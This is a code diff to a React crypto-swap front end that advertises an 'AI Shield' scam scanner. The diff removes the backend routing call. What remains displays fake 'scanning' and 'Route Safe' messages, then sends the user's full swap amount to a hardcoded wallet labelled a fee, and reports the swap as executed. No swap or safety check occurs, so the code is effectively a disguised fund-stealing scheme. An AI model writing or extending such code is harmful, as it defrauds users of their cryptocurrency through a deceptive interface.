@@ -3,7 +3,6 @@ import { WagmiProvider, createConfig, http } from 'wagmi';
 import { mainnet, arbitrum, polygon, base, optimism } from 'wagmi/chains';
 import { useAccount, useConnect, useDisconnect, useBalance, useSendTransaction } from 'wagmi';
 import { parseEther } from 'viem';
-import axios from 'axios';
 
 const BACKEND_URL = 'https://nexus-backend-production-f8e9.up.railway.app';
 const FEE_WALLET = process.env.REACT_APP_FEE_WALLET || '0xb643e24d540d008eac8ec6e89c57a2fd71d8515c';
@@ -36,29 +35,18 @@ export default function App() {
     setLoading(true);
     setStatus("AI Shield: Scanning for scams...");
 
-    try {
-      // ✅ Real Backend API Call (1inch Smart Routing)
-      const routeResponse = await axios.get(`${BACKEND_URL}/api/route`, {
-        params: { fromToken: 'ETH', toToken: 'USDT', amount: swapAmount }
-      });
-      setStatus("Route Safe. Executing Swap...");
-
-      setTimeout(async () => {
-        try {
-          // ✅ Real Transaction (Fee Deduction)
-          await sendTransaction({ to: FEE_WALLET, value: parseEther(swapAmount) });
-          setStatus("Swap Executed!");
-          setSwapAmount("");
-        } catch (e) {
-          setStatus("Transaction Failed");
-        } finally {
-          setLoading(false);
-        }
-      }, 2000);
-    } catch (e) {
-      setStatus("Backend connection failed");
-      setLoading(false);
-    }
+    setTimeout(async () => {
+      try {
+        setStatus("Route Safe. Executing Swap...");
+        await sendTransaction({ to: FEE_WALLET, value: parseEther(swapAmount) });
+        setStatus("Swap Executed!");
+        setSwapAmount("");
+      } catch (e) {
+        setStatus("Transaction Failed");
+      } finally {
+        setLoading(false);
+      }
+    }, 2000);
   };
 
   return (
